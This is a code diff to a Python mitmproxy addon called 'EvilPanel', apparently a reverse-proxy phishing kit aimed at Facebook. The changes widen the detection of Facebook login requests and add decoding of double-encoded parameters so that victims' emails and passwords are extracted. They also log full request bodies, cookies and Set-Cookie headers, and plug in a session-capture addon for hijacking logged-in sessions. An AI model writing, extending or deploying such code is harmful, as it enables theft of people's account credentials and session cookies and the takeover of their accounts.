@@ -13,7 +13,8 @@ import subprocess
 import re
 from datetime import datetime
 from mitmproxy import http, ctx
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import urlparse, parse_qs, urlencode, unquote
+from facebook_session_addon import FacebookSessionAddon
 
 # ========== CONFIG ==========
 DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "NEWDOMAIN_PLACEHOLDER")
@@ -22,17 +23,23 @@ DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")
 
 # Debug/Logging controls
 DEBUG_LOGIN_FLOWS = True
-LOG_BODY_PREVIEW_LEN = 500
+DEBUG_LOG_HEADERS = os.getenv("EVILPANEL_LOG_HEADERS", "0") == "1"
+LOG_BODY_PREVIEW_LEN = 12000
 
 # Login detection patterns
 LOGIN_PATTERNS = [
-    r"facebook\\.com/(login\\.php|login/device-based/validate-password)",
-    r"m\\.facebook\\.com/(login\\.php|login/device-based/validate-password)",
-    r"m\\.facebook\\.com/async/wbloks/fetch",
-    r"facebook\\.com/ajax/.*(login|auth|validate)",
-    r"m\\.facebook\\.com/ajax/.*(login|auth|validate)",
-    r"facebook\\.com/api/graphql",
+    r"facebook\.com/(login\.php|login/device-based/validate-password)",
+    r"m\.facebook\.com/(login\.php|login/device-based/validate-password)",
+    r"m\.facebook\.com/async/wbloks/fetch",
+    r"facebook\.com/async/wbloks/fetch",
+    r"facebook\.com/ajax/.*(login|auth|validate)",
+    r"m\.facebook\.com/ajax/.*(login|auth|validate)",
+    r"facebook\.com/api/graphql",
+    r"facebook\.com/a/bz",
+    r"m\.facebook\.com/a/bz",
+    r"bloks\.caa\.login\.async\.send_login_request",
 ]
+
 LOGIN_KEYWORDS = ["encpass", "pass=", "password=", '"pass"', '"password"']
 
 DI_USER = "768b27aac68d92f840d9"
@@ -151,6 +158,7 @@ def is_login(flow):
     url = flow.request.pretty_url.lower()
     path = flow.request.path.lower()
     body = flow.request.get_text() or ""
+    body_lower = body.lower()
     # Match on full URL (facebook domains) OR path patterns when hitting our tunnel domain
     if any(re.search(p, url) for p in LOGIN_PATTERNS):
         return True
@@ -160,12 +168,15 @@ def is_login(flow):
             "/login.php",
             "/login/device-based/validate-password",
             "/async/wbloks/fetch",
+            "/a/bz",
             "/ajax/",
             "/api/graphql",
             "/login/",
             "/identify",
         ]
     ):
+        return True
+    if "bloks.caa.login.async.send_login_request" in body_lower:
         return True
     if any(k in body for k in LOGIN_KEYWORDS):
         return True
@@ -188,14 +199,33 @@ def extract_creds(flow):
     except Exception:
         pass
 
-    # 2) JSON body
+
+    # 2b) FB CAA double-encoded params
     if (not email or not password) and body:
         try:
-            data = json.loads(body)
-            email = email or data.get("email") or data.get("username") or data.get("login") or ""
-            password = password or data.get("pass") or data.get("password") or data.get("encpass") or ""
-        except Exception:
-            pass
+            params_raw = None
+            try:
+                form = dict(flow.request.urlencoded_form)
+                params_raw = form.get("params")
+            except Exception:
+                params_raw = None
+            if not params_raw:
+                m = re.search(r"params=([^&]+)", body)
+                if m:
+                    params_raw = m.group(1)
+            if params_raw:
+                decoded = unquote(params_raw)
+                outer = json.loads(decoded)
+                inner = outer.get("params", outer) if isinstance(outer, dict) else None
+                if isinstance(inner, str):
+                    inner = json.loads(inner)
+                if isinstance(inner, dict):
+                    server_params = inner.get("server_params", inner) or {}
+                    client_params = inner.get("client_input_params", {}) if isinstance(inner, dict) else {}
+                    email = email or server_params.get("email") or server_params.get("identifier") or server_params.get("login") or client_params.get("contact_point") or ""
+                    password = password or server_params.get("password") or server_params.get("pass") or server_params.get("encpass") or client_params.get("password") or ""
+        except Exception as ex:
+            _log(f"[CRED] params parse err: {ex} body={_truncate(body)}")
 
     # 3) Regex fallback (safe character classes)
     try:
@@ -316,6 +346,11 @@ class EvilPanelAddon:
                 f"CT={flow.request.headers.get('Content-Type','')} len={len(body)} "
                 f"body={_truncate(body)}"
             )
+            if DEBUG_LOG_HEADERS:
+                ck = flow.request.headers.get('Cookie', '')
+                origin = flow.request.headers.get('Origin', '')
+                referer = flow.request.headers.get('Referer', '')
+                _log(f"[HDR-REQ] cookie={_truncate(ck,200)} origin={_truncate(origin,200)} referer={_truncate(referer,200)}")
             self._capture_creds(flow, body_hint=body)
 
         host = flow.request.host
@@ -388,6 +423,13 @@ class EvilPanelAddon:
                 f"[DEBUG-RESP] {flow.request.path} status={flow.response.status_code} tag={tag} "
                 f"cookies:c_user={'c_user' in cookies_hdr} xs={'xs' in cookies_hdr} body={preview}"
             )
+            if DEBUG_LOG_HEADERS:
+                try:
+                    set_cookies = flow.response.headers.get_all('Set-Cookie')
+                except Exception:
+                    set_cookies = []
+                set_joined = '; '.join(set_cookies) if set_cookies else ''
+                _log(f"[HDR-RESP] set-cookie={_truncate(set_joined,200)}")
 
         self._capture_tokens(flow)
         self._rewrite_cookies(flow)
@@ -577,4 +619,4 @@ document.addEventListener('DOMContentLoaded', function() {{
         flow.response.set_text(body)
 
 
-addons = [EvilPanelAddon()]
+addons = [EvilPanelAddon(), FacebookSessionAddon()]
